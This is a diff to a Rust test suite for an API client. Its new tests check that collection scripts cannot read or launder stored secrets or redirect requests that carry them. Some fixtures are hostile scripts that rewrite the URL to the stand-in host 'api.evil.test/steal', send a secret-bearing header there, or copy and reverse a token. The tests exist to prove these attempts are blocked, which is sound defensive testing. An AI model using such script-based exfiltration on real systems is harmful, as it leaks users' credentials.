@@ -187,10 +187,14 @@ fn no_error_variant_can_carry_a_secret_out_through_display() {
     let fixture = "s3cr3t-fixture-fd8c31a7b9";
     redact::register("prod", "token", fixture);
     let variants = CoreError::all_variants(&format!("while sending: {fixture} was rejected"));
+    // Coverage is the compiler's job — `assert_every_variant_is_listed` in error.rs
+    // stops compiling when a variant is added. Distinct codes prove no two entries
+    // here are the same variant repeated.
+    let codes: std::collections::BTreeSet<&str> = variants.iter().map(CoreError::code).collect();
     assert_eq!(
+        codes.len(),
         variants.len(),
-        22,
-        "every CoreError variant must be listed in all_variants"
+        "all_variants repeats a variant"
     );
     for error in variants {
         let shown = error.to_string();
@@ -306,5 +310,182 @@ fn a_legacy_bundle_with_flat_environment_vars_still_imports() {
     let doc = workspace::read_env_doc(dir.path(), "prod")
         .unwrap()
         .unwrap();
-    assert_eq!(doc.vars["base"], VarDef::plain("https://x.dev"));
+    assert_eq!(doc.vars["base"], VarDef::shared("https://x.dev"));
+}
+
+/// A collection is somebody else's code. These pin the one thing that stops a
+/// hostile pre-request script from walking a token out of the building.
+mod scripts_and_secrets {
+    use super::*;
+    use mandalo_core::assertions::Scripts;
+
+    fn scripted(url: &str, pre: &str) -> SavedRequest {
+        let mut request = request_to(url);
+        request.scripts = Scripts {
+            pre: Some(pre.to_string()),
+            post: None,
+        };
+        request
+    }
+
+    #[tokio::test]
+    async fn a_script_never_sees_a_resolved_secret() {
+        let dir = tempfile::tempdir().unwrap();
+        let mock = MockApi::start().await;
+        let store = MemorySecrets::new();
+        workspace_with_secret(dir.path(), &["127.0.0.1"], &store);
+
+        let runner = Runner::new(store, AllowAll);
+        let mut vars = frame(dir.path());
+        runner
+            .run_request(&request_to(&mock.url("/headers/echo")), &mut vars)
+            .await
+            .unwrap();
+
+        let step = runner
+            .run_request(
+                &scripted(
+                    &mock.url("/headers/echo"),
+                    r#"
+                    const seen = pm.environment.get("token")
+                    pm.environment.set("laundered", seen === undefined ? "withheld" : "readable")
+                    "#,
+                ),
+                &mut vars,
+            )
+            .await
+            .unwrap();
+
+        assert_eq!(
+            step.var_sets.get("laundered").map(String::as_str),
+            Some("withheld"),
+            "{:?}",
+            step.var_sets
+        );
+    }
+
+    #[tokio::test]
+    async fn a_script_cannot_launder_a_secret_into_a_plain_variable() {
+        let dir = tempfile::tempdir().unwrap();
+        let mock = MockApi::start().await;
+        let store = MemorySecrets::new();
+        workspace_with_secret(dir.path(), &["127.0.0.1"], &store);
+
+        let runner = Runner::new(store, AllowAll);
+        let mut vars = frame(dir.path());
+        runner
+            .run_request(&request_to(&mock.url("/headers/echo")), &mut vars)
+            .await
+            .unwrap();
+
+        let step = runner
+            .run_request(
+                &scripted(
+                    &mock.url("/headers/echo"),
+                    r#"
+                    const token = pm.environment.get("token") || ""
+                    pm.environment.set("harmless", token.split("").reverse().join(""))
+                    "#,
+                ),
+                &mut vars,
+            )
+            .await
+            .unwrap();
+
+        let reversed: String = SECRET.chars().rev().collect();
+        assert_eq!(
+            step.var_sets.get("harmless").map(String::as_str),
+            Some(""),
+            "the script had nothing to reverse"
+        );
+        assert!(!vars.get("harmless").unwrap_or_default().contains(&reversed));
+        let written = serde_json::to_string(&step.var_sets).unwrap();
+        assert!(
+            !written.contains(SECRET) && !written.contains(&reversed),
+            "a script write may carry neither the secret nor a transformation of it: {written}"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_script_that_rewrites_the_url_still_meets_the_host_binding() {
+        let dir = tempfile::tempdir().unwrap();
+        let mock = MockApi::start().await;
+        let store = MemorySecrets::new();
+        workspace_with_secret(dir.path(), &["127.0.0.1"], &store);
+
+        let runner = Runner::new(store, AllowAll);
+        let mut vars = frame(dir.path());
+        let error = runner
+            .run_request(
+                &scripted(
+                    &mock.url("/headers/echo"),
+                    r#"pm.request.url = "https://api.evil.test/steal""#,
+                ),
+                &mut vars,
+            )
+            .await
+            .unwrap_err();
+
+        assert_eq!(error.code(), "E_SECRET_HOST_DENIED");
+        assert!(error.to_string().contains("api.evil.test"), "{error}");
+    }
+
+    #[tokio::test]
+    async fn a_value_that_carries_a_secret_inherits_its_binding() {
+        let dir = tempfile::tempdir().unwrap();
+        let mock = MockApi::start().await;
+        let store = MemorySecrets::new();
+        workspace_with_secret(dir.path(), &["127.0.0.1"], &store);
+
+        let runner = Runner::new(store, AllowAll);
+        let mut vars = frame(dir.path());
+        let mut echoed = request_to(&mock.url("/headers/echo"));
+        echoed.scripts = Scripts {
+            pre: None,
+            post: Some(r#"pm.environment.set("copy", pm.response.text())"#.to_string()),
+        };
+        let step = runner.run_request(&echoed, &mut vars).await.unwrap();
+
+        assert!(step.error.is_none(), "{:?}", step.error);
+        assert!(
+            vars.get("copy").unwrap_or_default().contains(SECRET),
+            "the mock echoes the header, which is how the copy gets made"
+        );
+        assert!(
+            !step.var_sets.contains_key("copy"),
+            "a value carrying a secret is never reported back as a plain write"
+        );
+
+        let mut leak = fixtures::request("Leak", "GET", "https://api.evil.test/steal");
+        leak.headers = vec![("X-Copy".to_string(), "{{copy}}".to_string())];
+        let error = runner.run_request(&leak, &mut vars).await.unwrap_err();
+        assert_eq!(error.code(), "E_SECRET_HOST_DENIED");
+    }
+
+    #[tokio::test]
+    async fn a_plain_variable_a_script_writes_still_works_normally() {
+        let dir = tempfile::tempdir().unwrap();
+        let mock = MockApi::start().await;
+        let store = MemorySecrets::new();
+        workspace_with_secret(dir.path(), &["127.0.0.1"], &store);
+
+        let runner = Runner::new(store, AllowAll);
+        let mut vars = frame(dir.path());
+        let mut request = scripted(
+            &mock.url("/headers/echo"),
+            r#"pm.environment.set("trace", "abc-123")"#,
+        );
+        request.headers = vec![("X-Trace".to_string(), "{{trace}}".to_string())];
+
+        let step = runner.run_request(&request, &mut vars).await.unwrap();
+
+        assert!(step.error.is_none(), "{:?}", step.error);
+        assert_eq!(
+            step.var_sets.get("trace").map(String::as_str),
+            Some("abc-123")
+        );
+        assert_eq!(vars.get("trace"), Some("abc-123"));
+        let sent = mock.last_request().unwrap();
+        assert_eq!(sent.header("x-trace"), Some("abc-123"));
+    }
 }
